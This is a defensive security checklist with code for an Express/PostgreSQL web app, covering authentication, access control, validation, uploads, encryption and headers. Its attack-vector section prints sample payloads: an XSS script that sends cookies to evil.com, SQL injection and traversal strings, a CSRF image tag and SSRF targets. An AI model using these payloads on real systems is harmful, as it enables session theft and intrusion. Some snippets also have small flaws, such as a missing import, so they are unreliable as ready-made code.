# Production Security Checklist

**Status**: Implementation Guide  
**Date**: January 22, 2026  
**Stack**: Express.js, PostgreSQL, Drizzle ORM, Node.js

---

## Table of Contents

1. [Authentication Security](#authentication-security)
2. [Authorization & Access Control](#authorization--access-control)
3. [Input Validation](#input-validation)
4. [Rate Limiting](#rate-limiting)
5. [File Upload Security](#file-upload-security)
6. [Data Encryption](#data-encryption)
7. [Common Attack Vectors](#common-attack-vectors)
8. [Security Headers](#security-headers)
9. [Dependency Security](#dependency-security)
10. [Audit & Compliance](#audit--compliance)

---

## Authentication Security

### ✅ Checklist

#### Password Security
- [ ] Enforce minimum password length (12+ characters)
- [ ] Require password complexity (uppercase, lowercase, numbers, symbols)
- [ ] Use bcrypt with minimum cost factor of 12 for password hashing
- [ ] Prevent password reuse (store last 5 password hashes)
- [ ] Implement password expiration policy (90 days for admin accounts)
- [ ] Block common/leaked passwords (check against HaveIBeenPwned API)
- [ ] Never log, display, or transmit passwords in plaintext

#### Session Management
- [ ] Use secure, httpOnly, sameSite cookies for session tokens
- [ ] Set appropriate cookie expiration (30 min idle, 8 hours absolute)
- [ ] Implement session rotation on privilege escalation
- [ ] Store session data server-side (Redis/database), not in JWT payload
- [ ] Invalidate all sessions on password change
- [ ] Implement secure logout (clear cookies, invalidate server session)
- [ ] Use CSRF tokens for state-changing operations

#### Multi-Factor Authentication (MFA)
- [ ] Support TOTP-based MFA (Google Authenticator, Authy)
- [ ] Require MFA for admin accounts
- [ ] Store backup codes securely (hashed)
- [ ] Rate-limit MFA verification attempts (5 per 15 minutes)
- [ ] Implement MFA enrollment enforcement period

#### Account Security
- [ ] Lock accounts after 5 failed login attempts (15-minute lockout)
- [ ] Send email notifications for suspicious login attempts
- [ ] Implement IP-based login throttling
- [ ] Track login history (IP, user agent, timestamp, success/failure)
- [ ] Require email verification for new accounts
- [ ] Implement secure password reset flow with time-limited tokens
- [ ] Never reveal whether an email exists during password reset

### 🛡️ Implementation

```javascript
// src/middleware/auth.js
import bcrypt from 'bcrypt';
import crypto from 'crypto';
import { logAuthFailure } from '../observability.js';

const BCRYPT_ROUNDS = 12;
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes

export async function hashPassword(password) {
  // Validate password strength
  if (password.length < 12) {
    throw new Error('Password must be at least 12 characters');
  }
  
  if (!/[A-Z]/.test(password) || !/[a-z]/.test(password) || 
      !/[0-9]/.test(password) || !/[^A-Za-z0-9]/.test(password)) {
    throw new Error('Password must contain uppercase, lowercase, number, and symbol');
  }
  
  return bcrypt.hash(password, BCRYPT_ROUNDS);
}

export async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

export async function handleLoginAttempt(req, res, next) {
  const { email, password } = req.body;
  
  // Check for account lockout
  const user = await db.select().from(users).where(eq(users.email, email)).limit(1);
  
  if (!user.length) {
    logAuthFailure({ email, reason: 'user_not_found', ip: req.ip });
    await simulateDelay(); // Timing attack mitigation
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const account = user[0];
  
  if (account.locked_until && new Date(account.locked_until) > new Date()) {
    logAuthFailure({ userId: account.id, reason: 'account_locked', ip: req.ip });
    return res.status(423).json({ error: 'Account temporarily locked' });
  }
  
  const valid = await verifyPassword(password, account.password_hash);
  
  if (!valid) {
    const attempts = account.failed_login_attempts + 1;
    
    await db.update(users)
      .set({ 
        failed_login_attempts: attempts,
        locked_until: attempts >= MAX_LOGIN_ATTEMPTS 
          ? new Date(Date.now() + LOCKOUT_DURATION) 
          : null
      })
      .where(eq(users.id, account.id));
    
    logAuthFailure({ 
      userId: account.id, 
      reason: 'invalid_password', 
      ip: req.ip,
      attempts 
    });
    
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Reset failed attempts on successful login
  await db.update(users)
    .set({ failed_login_attempts: 0, locked_until: null })
    .where(eq(users.id, account.id));
  
  req.user = account;
  next();
}

// Timing attack mitigation
function simulateDelay() {
  return new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 200));
}

// Secure session configuration
export const sessionConfig = {
  secret: process.env.SESSION_SECRET,
  name: 'sid', // Don't use default 'connect.sid'
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000, // 30 minutes
  },
  rolling: true, // Extend session on activity
};
```

---

## Authorization & Access Control

### ✅ Checklist

#### Role-Based Access Control (RBAC)
- [ ] Define clear roles (student, src, admin, super_admin)
- [ ] Implement least privilege principle (minimum permissions needed)
- [ ] Store permissions in database, not hardcoded
- [ ] Validate permissions on every protected route
- [ ] Use middleware for consistent authorization checks
- [ ] Deny by default (explicit allow, not explicit deny)
- [ ] Separate read/write permissions

#### Resource-Level Authorization
- [ ] Verify user owns resource before allowing access
- [ ] Implement organization/university-level isolation
- [ ] Prevent horizontal privilege escalation (accessing peer data)
- [ ] Prevent vertical privilege escalation (accessing admin functions)
- [ ] Validate all IDs against authorized scope
- [ ] Use parameterized queries to prevent SQL injection in auth checks

#### API Authorization
- [ ] Require authentication for all non-public endpoints
- [ ] Validate JWT signatures and expiration
- [ ] Check token revocation list for logged-out users
- [ ] Implement API key rotation for service accounts
- [ ] Use different tokens for different privilege levels

### 🛡️ Implementation

```javascript
// src/middleware/authorization.js
import { logAuthFailure } from '../observability.js';

// Role hierarchy (higher number = more privileges)
const ROLES = {
  student: 1,
  src: 2,
  admin: 3,
  super_admin: 4
};

export function requireRole(minimumRole) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    const userRoleLevel = ROLES[req.user.role] || 0;
    const requiredLevel = ROLES[minimumRole];
    
    if (userRoleLevel < requiredLevel) {
      logAuthFailure({
        userId: req.user.id,
        reason: 'insufficient_permissions',
        required: minimumRole,
        actual: req.user.role,
        path: req.path
      });
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    next();
  };
}

export function requireOwnership(resourceType) {
  return async (req, res, next) => {
    const resourceId = req.params.id;
    const userId = req.user.id;
    
    try {
      let resource;
      
      switch (resourceType) {
        case 'application':
          resource = await db.select()
            .from(applications)
            .where(eq(applications.id, resourceId))
            .limit(1);
          
          if (!resource.length || resource[0].student_id !== userId) {
            return res.status(403).json({ error: 'Access denied' });
          }
          break;
          
        case 'delivery':
          resource = await db.select()
            .from(deliveries)
            .innerJoin(applications, eq(deliveries.application_id, applications.id))
            .where(eq(deliveries.id, resourceId))
            .limit(1);
          
          if (!resource.length || resource[0].applications.student_id !== userId) {
            return res.status(403).json({ error: 'Access denied' });
          }
          break;
          
        default:
          return res.status(500).json({ error: 'Invalid resource type' });
      }
      
      req.resource = resource[0];
      next();
    } catch (error) {
      logger.error({ err: error, resourceType, resourceId }, 'Ownership check failed');
      res.status(500).json({ error: 'Authorization check failed' });
    }
  };
}

// Example route protection
app.get('/api/applications/:id', 
  authenticate,
  requireOwnership('application'),
  getApplication
);

app.delete('/api/users/:id',
  authenticate,
  requireRole('admin'),
  deleteUser
);
```

---

## Input Validation

### ✅ Checklist

#### General Validation
- [ ] Validate all user input (params, query, body, headers)
- [ ] Use whitelist validation (allow known good, not block known bad)
- [ ] Sanitize input before processing or storage
- [ ] Validate data types, length, format, and range
- [ ] Reject requests with unexpected fields
- [ ] Use schema validation library (Zod, Joi, Yup)
- [ ] Validate on both client and server (never trust client)

#### SQL Injection Prevention
- [ ] Use parameterized queries (Drizzle query builder, not raw SQL)
- [ ] Never concatenate user input into SQL strings
- [ ] Validate all IDs as integers/UUIDs before querying
- [ ] Use ORM features for safe dynamic queries
- [ ] Escape special characters if raw SQL is unavoidable

#### XSS Prevention
- [ ] Sanitize HTML in user-generated content
- [ ] Use Content-Security-Policy headers
- [ ] Escape output in templates (React auto-escapes)
- [ ] Validate URLs before rendering links
- [ ] Strip JavaScript from uploaded files

#### Command Injection Prevention
- [ ] Never pass user input to `exec`, `eval`, or `spawn`
- [ ] Validate file paths to prevent directory traversal
- [ ] Use allowlists for file operations
- [ ] Sanitize filenames before storage

### 🛡️ Implementation

```javascript
// src/middleware/validationMiddleware.js
import { z } from 'zod';
import sanitizeHtml from 'sanitize-html';

// Schema examples
const applicationSchema = z.object({
  student_id: z.number().int().positive(),
  university_id: z.number().int().positive(),
  laptop_model_id: z.number().int().positive(),
  reason: z.string().min(50).max(1000),
  gpa: z.number().min(0).max(4.0),
  documents: z.array(z.string().uuid()).max(5)
});

const deliveryAddressSchema = z.object({
  street: z.string().min(5).max(200),
  city: z.string().min(2).max(100),
  state: z.string().length(2), // US state code
  zip: z.string().regex(/^\d{5}(-\d{4})?$/),
  phone: z.string().regex(/^\+?1?\d{10,14}$/)
});

export function validate(schema) {
  return (req, res, next) => {
    try {
      const validated = schema.parse(req.body);
      req.validatedBody = validated;
      next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({
          error: 'Validation failed',
          details: error.errors.map(e => ({
            field: e.path.join('.'),
            message: e.message
          }))
        });
      }
      next(error);
    }
  };
}

// Sanitize HTML in rich text fields
export function sanitizeInput(field) {
  return (req, res, next) => {
    if (req.body[field]) {
      req.body[field] = sanitizeHtml(req.body[field], {
        allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
        allowedAttributes: {}
      });
    }
    next();
  };
}

// Validate UUIDs in params
export function validateUuid(param) {
  return (req, res, next) => {
    const value = req.params[param];
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
    
    if (!uuidRegex.test(value)) {
      return res.status(400).json({ error: `Invalid ${param} format` });
    }
    
    next();
  };
}

// Example usage
app.post('/api/applications',
  authenticate,
  validate(applicationSchema),
  createApplication
);

app.put('/api/delivery/:id/address',
  authenticate,
  validateUuid('id'),
  validate(deliveryAddressSchema),
  updateDeliveryAddress
);
```

---

## Rate Limiting

### ✅ Checklist

#### API Rate Limiting
- [ ] Implement global rate limit (1000 req/hour per IP)
- [ ] Add endpoint-specific limits (login: 5/15min, signup: 3/hour)
- [ ] Use sliding window algorithm (not fixed window)
- [ ] Return 429 status with Retry-After header
- [ ] Implement rate limit by user ID (authenticated requests)
- [ ] Whitelist internal/monitoring IPs
- [ ] Log rate limit violations

#### DDoS Protection
- [ ] Use reverse proxy rate limiting (Nginx, Cloudflare)
- [ ] Implement connection throttling
- [ ] Set request size limits (100KB for JSON, 10MB for file uploads)
- [ ] Add timeout for slow requests (30 seconds)
- [ ] Implement CAPTCHA for sensitive endpoints after threshold

#### Brute Force Prevention
- [ ] Rate limit login attempts (5 per 15 minutes per email)
- [ ] Rate limit password reset (3 per hour per email)
- [ ] Rate limit MFA verification (5 per 15 minutes)
- [ ] Implement exponential backoff for repeated failures
- [ ] Track failed attempts across distributed systems (Redis)

### 🛡️ Implementation

```javascript
// src/middleware/rateLimiter.js (ENHANCED VERSION)
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { createClient } from 'redis';

const redisClient = createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379'
});
await redisClient.connect();

// Global rate limit
export const globalLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:global:'
  }),
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 1000, // 1000 requests per hour
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    logger.warn({ ip: req.ip, path: req.path }, 'Rate limit exceeded');
    res.status(429).json({ 
      error: 'Too many requests',
      retryAfter: Math.ceil(req.rateLimit.resetTime.getTime() / 1000)
    });
  }
});

// Strict rate limit for authentication endpoints
export const authLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:auth:'
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  skipSuccessfulRequests: true, // Only count failed attempts
  keyGenerator: (req) => {
    // Rate limit by email + IP to prevent distributed attacks
    return `${req.body.email || 'unknown'}:${req.ip}`;
  }
});

// File upload rate limit
export const uploadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10, // 10 uploads per hour
  keyGenerator: (req) => req.user?.id || req.ip
});

// Payment endpoint rate limit
export const paymentLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 20, // 20 payment attempts per hour
  keyGenerator: (req) => req.user.id
});

// Apply to routes
app.use('/api', globalLimiter);
app.post('/api/auth/login', authLimiter, login);
app.post('/api/auth/register', authLimiter, register);
app.post('/api/documents/upload', authenticate, uploadLimiter, uploadDocument);
app.post('/api/payments/process', authenticate, paymentLimiter, processPayment);
```

---

## File Upload Security

### ✅ Checklist

#### File Validation
- [ ] Validate file type by magic bytes, not extension
- [ ] Enforce file size limits (5MB for documents, 2MB for images)
- [ ] Scan uploads with antivirus (ClamAV)
- [ ] Reject executable files (.exe, .sh, .bat, .jar)
- [ ] Validate image dimensions and aspect ratio
- [ ] Strip EXIF metadata from images

#### Storage Security
- [ ] Store files outside web root (prevent direct access)
- [ ] Generate random filenames (prevent guessing)
- [ ] Store original filename separately in database
- [ ] Use separate storage service (S3, Azure Blob) with signed URLs
- [ ] Set appropriate S3 bucket permissions (private, not public)
- [ ] Enable S3 versioning and logging
- [ ] Implement virus scanning before making files accessible

#### Access Control
- [ ] Require authentication to download files
- [ ] Verify user owns file before allowing download
- [ ] Use time-limited signed URLs (expiry: 15 minutes)
- [ ] Log all file access attempts
- [ ] Implement download rate limiting
- [ ] Add watermarks to sensitive documents

#### Content Delivery
- [ ] Serve files with correct Content-Type header
- [ ] Set Content-Disposition: attachment for downloads
- [ ] Use X-Content-Type-Options: nosniff
- [ ] Implement CDN for public assets (CloudFront, Cloudflare)
- [ ] Enable HTTPS for all file transfers

### 🛡️ Implementation

```javascript
// src/middleware/fileUploadSecurity.js
import multer from 'multer';
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import crypto from 'crypto';
import fileType from 'file-type';
import sharp from 'sharp';

const ALLOWED_MIME_TYPES = {
  documents: ['application/pdf', 'application/msword', 
              'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
  images: ['image/jpeg', 'image/png', 'image/webp']
};

const MAX_FILE_SIZE = {
  documents: 5 * 1024 * 1024, // 5MB
  images: 2 * 1024 * 1024 // 2MB
};

// Multer configuration with memory storage
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB absolute max
    files: 5 // Max 5 files per request
  },
  fileFilter: (req, file, cb) => {
    // Basic extension check (will verify magic bytes later)
    const ext = file.originalname.split('.').pop().toLowerCase();
    const dangerousExtensions = ['exe', 'sh', 'bat', 'cmd', 'com', 'jar', 'js', 'vbs'];
    
    if (dangerousExtensions.includes(ext)) {
      return cb(new Error('File type not allowed'));
    }
    
    cb(null, true);
  }
});

// Validate file type by magic bytes
export async function validateFileType(buffer, category) {
  const type = await fileType.fromBuffer(buffer);
  
  if (!type || !ALLOWED_MIME_TYPES[category].includes(type.mime)) {
    throw new Error(`Invalid file type. Allowed: ${ALLOWED_MIME_TYPES[category].join(', ')}`);
  }
  
  return type;
}

// Scan file for viruses (placeholder - integrate ClamAV)
async function scanForVirus(buffer) {
  // TODO: Integrate with ClamAV or cloud antivirus service
  // Example: await clamav.scan(buffer);
  return { infected: false };
}

// Upload to S3 with security
const s3Client = new S3Client({ region: process.env.AWS_REGION });

export async function uploadToS3(buffer, fileType, userId) {
  // Generate random filename
  const randomName = crypto.randomBytes(16).toString('hex');
  const key = `uploads/${userId}/${randomName}.${fileType.ext}`;
  
  const command = new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: key,
    Body: buffer,
    ContentType: fileType.mime,
    ServerSideEncryption: 'AES256',
    Metadata: {
      uploadedBy: userId.toString(),
      uploadedAt: new Date().toISOString()
    }
  });
  
  await s3Client.send(command);
  
  return {
    key,
    bucket: process.env.S3_BUCKET,
    size: buffer.length
  };
}

// Generate signed download URL
export async function generateDownloadUrl(key, expiresIn = 900) {
  const command = new GetObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: key,
    ResponseContentDisposition: 'attachment'
  });
  
  return getSignedUrl(s3Client, command, { expiresIn });
}

// Complete upload handler
export const handleFileUpload = [
  upload.single('file'),
  async (req, res, next) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }
      
      const category = req.body.category || 'documents';
      
      // Validate file size
      if (req.file.size > MAX_FILE_SIZE[category]) {
        return res.status(400).json({ 
          error: `File too large. Max: ${MAX_FILE_SIZE[category] / 1024 / 1024}MB` 
        });
      }
      
      // Validate file type by magic bytes
      const type = await validateFileType(req.file.buffer, category);
      
      // Scan for viruses
      const scanResult = await scanForVirus(req.file.buffer);
      if (scanResult.infected) {
        logApiError({ 
          event: 'virus_detected', 
          userId: req.user.id, 
          filename: req.file.originalname 
        });
        return res.status(400).json({ error: 'File failed security scan' });
      }
      
      // Process image if applicable
      let processedBuffer = req.file.buffer;
      if (category === 'images') {
        processedBuffer = await sharp(req.file.buffer)
          .resize(2000, 2000, { fit: 'inside', withoutEnlargement: true })
          .rotate() // Auto-rotate based on EXIF
          .withMetadata(false) // Strip EXIF data
          .toBuffer();
      }
      
      // Upload to S3
      const s3Result = await uploadToS3(processedBuffer, type, req.user.id);
      
      // Store metadata in database
      const doc = await db.insert(documents).values({
        user_id: req.user.id,
        original_filename: req.file.originalname,
        stored_filename: s3Result.key,
        mime_type: type.mime,
        size: s3Result.size,
        bucket: s3Result.bucket,
        uploaded_at: new Date()
      }).returning();
      
      res.json({
        success: true,
        document: {
          id: doc[0].id,
          filename: req.file.originalname,
          size: s3Result.size
        }
      });
    } catch (error) {
      logger.error({ err: error }, 'File upload failed');
      res.status(500).json({ error: 'Upload failed' });
    }
  }
];
```

---

## Data Encryption

### ✅ Checklist

#### Data at Rest
- [ ] Encrypt database with Transparent Data Encryption (TDE)
- [ ] Enable PostgreSQL encryption (pgcrypto extension)
- [ ] Encrypt sensitive columns (SSN, credit cards, medical records)
- [ ] Use AES-256-GCM for column-level encryption
- [ ] Store encryption keys in AWS KMS or HashiCorp Vault
- [ ] Rotate encryption keys annually
- [ ] Encrypt database backups
- [ ] Encrypt file storage (S3 server-side encryption)

#### Data in Transit
- [ ] Enforce HTTPS/TLS 1.3 for all connections
- [ ] Use SSL for database connections
- [ ] Implement HSTS header (max-age: 31536000)
- [ ] Disable weak ciphers (DES, RC4, 3DES)
- [ ] Use certificate pinning for mobile apps
- [ ] Enable TLS for Redis connections
- [ ] Validate SSL certificates (no self-signed in prod)

#### Key Management
- [ ] Use environment variables for secrets (never hardcode)
- [ ] Rotate API keys and secrets quarterly
- [ ] Use different keys per environment (dev/staging/prod)
- [ ] Implement key versioning
- [ ] Store keys in secure vault (AWS Secrets Manager, Vault)
- [ ] Audit key access logs
- [ ] Revoke compromised keys immediately

#### PII Protection
- [ ] Tokenize credit card numbers (Stripe, Braintree)
- [ ] Hash email addresses in analytics/logs
- [ ] Redact sensitive data in logs (already in observability.js)
- [ ] Implement data masking in non-prod environments
- [ ] Use pseudonymization for user analytics

### 🛡️ Implementation

```javascript
// src/utils/encryption.js
import crypto from 'crypto';
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const AUTH_TAG_LENGTH = 16;
const SALT_LENGTH = 64;

// Fetch encryption key from AWS Secrets Manager
const secretsClient = new SecretsManagerClient({ region: process.env.AWS_REGION });
let masterKey;

async function getMasterKey() {
  if (masterKey) return masterKey;
  
  const command = new GetSecretValueCommand({
    SecretId: process.env.ENCRYPTION_KEY_SECRET_ID
  });
  
  const response = await secretsClient.send(command);
  masterKey = Buffer.from(JSON.parse(response.SecretString).key, 'hex');
  
  return masterKey;
}

// Encrypt sensitive data
export async function encrypt(plaintext) {
  const key = await getMasterKey();
  const iv = crypto.randomBytes(IV_LENGTH);
  
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  
  let encrypted = cipher.update(plaintext, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  const authTag = cipher.getAuthTag();
  
  // Return IV + authTag + ciphertext (all hex)
  return iv.toString('hex') + authTag.toString('hex') + encrypted;
}

// Decrypt sensitive data
export async function decrypt(encryptedData) {
  const key = await getMasterKey();
  
  const iv = Buffer.from(encryptedData.slice(0, IV_LENGTH * 2), 'hex');
  const authTag = Buffer.from(
    encryptedData.slice(IV_LENGTH * 2, (IV_LENGTH + AUTH_TAG_LENGTH) * 2), 
    'hex'
  );
  const encrypted = encryptedData.slice((IV_LENGTH + AUTH_TAG_LENGTH) * 2);
  
  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
  decipher.setAuthTag(authTag);
  
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

// Hash PII for analytics (one-way, non-reversible)
export function hashPii(data, purpose = 'analytics') {
  const salt = process.env[`${purpose.toUpperCase()}_SALT`] || 'default-salt';
  return crypto.createHmac('sha256', salt)
    .update(data)
    .digest('hex');
}

// Example: Encrypt SSN before storage
app.post('/api/users/kyc', authenticate, async (req, res) => {
  const { ssn, ...otherData } = req.body;
  
  const encryptedSsn = await encrypt(ssn);
  
  await db.insert(user_kyc).values({
    user_id: req.user.id,
    ssn_encrypted: encryptedSsn,
    ...otherData
  });
  
  res.json({ success: true });
});

// Example: Decrypt for verification
app.get('/api/users/kyc/verify', authenticate, requireRole('admin'), async (req, res) => {
  const kyc = await db.select()
    .from(user_kyc)
    .where(eq(user_kyc.user_id, req.params.userId))
    .limit(1);
  
  const decryptedSsn = await decrypt(kyc[0].ssn_encrypted);
  
  // Perform verification...
});

// TLS/SSL enforcement
export function enforceHttps(req, res, next) {
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    return res.redirect(301, `https://${req.headers.host}${req.url}`);
  }
  next();
}

// Security headers
import helmet from 'helmet';

app.use(helmet({
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", process.env.API_URL],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  }
}));
```

---

## Common Attack Vectors

### 🚨 SQL Injection

**Risk**: Attacker injects malicious SQL to access/modify database  
**Example**:
```javascript
// ❌ VULNERABLE
const email = req.query.email;
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Attacker sends: ?email=' OR '1'='1
```

**Prevention**:
```javascript
// ✅ SAFE - Use parameterized queries
const users = await db.select()
  .from(users)
  .where(eq(users.email, req.query.email));
```

---

### 🚨 Cross-Site Scripting (XSS)

**Risk**: Attacker injects JavaScript to steal session tokens or redirect users  
**Example**:
```html
<!-- ❌ VULNERABLE -->
<div>{userComment}</div>
<!-- Attacker submits: <script>fetch('evil.com?cookie='+document.cookie)</script> -->
```

**Prevention**:
```javascript
// ✅ SAFE - React auto-escapes
<div>{userComment}</div> {/* React escapes HTML */}

// For raw HTML, sanitize:
import sanitizeHtml from 'sanitize-html';
const clean = sanitizeHtml(userComment);
```

---

### 🚨 Cross-Site Request Forgery (CSRF)

**Risk**: Attacker tricks user into making unwanted requests  
**Example**:
```html
<!-- ❌ Attacker's site -->
<img src="https://yourapp.com/api/transfer?to=attacker&amount=1000">
<!-- Executes if user is logged in -->
```

**Prevention**:
```javascript
// ✅ SAFE - Use CSRF tokens
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

app.post('/api/transfer', csrfProtection, (req, res) => {
  // Validates CSRF token from cookie/header
});

// Also use SameSite cookies
cookie: {
  sameSite: 'strict'
}
```

---

### 🚨 Insecure Direct Object Reference (IDOR)

**Risk**: Attacker accesses resources by guessing/changing IDs  
**Example**:
```javascript
// ❌ VULNERABLE
app.get('/api/applications/:id', async (req, res) => {
  const app = await db.select()
    .from(applications)
    .where(eq(applications.id, req.params.id));
  res.json(app);
  // Any user can access any application by ID
});
```

**Prevention**:
```javascript
// ✅ SAFE - Verify ownership
app.get('/api/applications/:id', authenticate, async (req, res) => {
  const app = await db.select()
    .from(applications)
    .where(
      and(
        eq(applications.id, req.params.id),
        eq(applications.student_id, req.user.id) // Ownership check
      )
    );
  
  if (!app.length) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  res.json(app[0]);
});
```

---

### 🚨 Server-Side Request Forgery (SSRF)

**Risk**: Attacker makes server request internal/external URLs  
**Example**:
```javascript
// ❌ VULNERABLE
app.post('/api/fetch-url', async (req, res) => {
  const data = await fetch(req.body.url); // Attacker sends: http://localhost:6379
  res.json(data);
});
```

**Prevention**:
```javascript
// ✅ SAFE - Validate URLs
import { URL } from 'url';

const ALLOWED_DOMAINS = ['api.stripe.com', 'api.sendgrid.com'];

function isAllowedUrl(urlString) {
  try {
    const url = new URL(urlString);
    
    // Block internal IPs
    const blockedHosts = ['localhost', '127.0.0.1', '0.0.0.0', '::1'];
    if (blockedHosts.includes(url.hostname)) return false;
    
    // Block private IP ranges
    if (/^10\./.test(url.hostname) || 
        /^192\.168\./.test(url.hostname) ||
        /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(url.hostname)) {
      return false;
    }
    
    // Whitelist allowed domains
    return ALLOWED_DOMAINS.some(domain => url.hostname.endsWith(domain));
  } catch {
    return false;
  }
}

app.post('/api/fetch-url', (req, res) => {
  if (!isAllowedUrl(req.body.url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  // Safe to fetch
});
```

---

### 🚨 Directory Traversal

**Risk**: Attacker accesses files outside intended directory  
**Example**:
```javascript
// ❌ VULNERABLE
app.get('/files/:filename', (req, res) => {
  res.sendFile(`/uploads/${req.params.filename}`);
  // Attacker sends: ../../etc/passwd
});
```

**Prevention**:
```javascript
// ✅ SAFE - Validate paths
import path from 'path';

app.get('/files/:filename', (req, res) => {
  const filename = path.basename(req.params.filename); // Remove path components
  const filePath = path.join('/uploads', filename);
  
  // Verify path is within uploads directory
  if (!filePath.startsWith('/uploads/')) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  res.sendFile(filePath);
});
```

---

### 🚨 Mass Assignment

**Risk**: Attacker modifies unintended fields via bulk update  
**Example**:
```javascript
// ❌ VULNERABLE
app.put('/api/profile', authenticate, async (req, res) => {
  await db.update(users)
    .set(req.body) // Attacker sends: { role: 'admin' }
    .where(eq(users.id, req.user.id));
});
```

**Prevention**:
```javascript
// ✅ SAFE - Whitelist allowed fields
const ALLOWED_FIELDS = ['name', 'email', 'phone', 'address'];

app.put('/api/profile', authenticate, validate(profileSchema), async (req, res) => {
  const updates = {};
  
  ALLOWED_FIELDS.forEach(field => {
    if (req.validatedBody[field] !== undefined) {
      updates[field] = req.validatedBody[field];
    }
  });
  
  await db.update(users)
    .set(updates)
    .where(eq(users.id, req.user.id));
});
```

---

### 🚨 Timing Attacks

**Risk**: Attacker infers information from response time differences  
**Example**:
```javascript
// ❌ VULNERABLE - Early return reveals user existence
app.post('/login', async (req, res) => {
  const user = await db.select().from(users).where(eq(users.email, req.body.email));
  
  if (!user.length) {
    return res.status(401).json({ error: 'User not found' }); // Fast response
  }
  
  const valid = await bcrypt.compare(req.body.password, user[0].password_hash); // Slow response
  
  if (!valid) {
    return res.status(401).json({ error: 'Invalid password' });
  }
});
```

**Prevention**:
```javascript
// ✅ SAFE - Constant time response
app.post('/login', async (req, res) => {
  const user = await db.select().from(users).where(eq(users.email, req.body.email));
  
  // Always compute hash, even if user doesn't exist
  const passwordHash = user.length ? user[0].password_hash : await bcrypt.hash('dummy', 12);
  
  const valid = await bcrypt.compare(req.body.password, passwordHash);
  
  if (!user.length || !valid) {
    await simulateDelay(); // Add random delay
    return res.status(401).json({ error: 'Invalid credentials' }); // Generic message
  }
  
  // Success path
});
```

---

## Security Headers

### ✅ Implementation

```javascript
import helmet from 'helmet';

app.use(helmet());

// Custom headers
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // Enable XSS filter
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // Referrer policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Permissions policy
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  
  next();
});
```

---

## Dependency Security

### ✅ Checklist

- [ ] Run `npm audit` weekly and fix vulnerabilities
- [ ] Enable Dependabot/Renovate for automated dependency updates
- [ ] Review and test dependency updates before merging
- [ ] Pin exact versions in package.json for production
- [ ] Use `npm ci` in CI/CD (respects lock file exactly)
- [ ] Scan Docker images for vulnerabilities (Trivy, Snyk)
- [ ] Remove unused dependencies
- [ ] Avoid dependencies with no maintainers or few downloads
- [ ] Check dependency licenses for compliance

---

## Audit & Compliance

### ✅ Checklist

#### Logging & Monitoring
- [ ] Log all authentication events (success/failure)
- [ ] Log authorization failures
- [ ] Log sensitive data access (view/download/delete)
- [ ] Log configuration changes
- [ ] Retain logs for 90 days (compliance requirement)
- [ ] Monitor for suspicious patterns (geo-impossible travel)
- [ ] Set up alerts for security events

#### Compliance
- [ ] GDPR: Right to access, delete, export user data
- [ ] GDPR: Consent management for data processing
- [ ] GDPR: Data breach notification within 72 hours
- [ ] PCI DSS: Never store CVV/PIN (use Stripe tokenization)
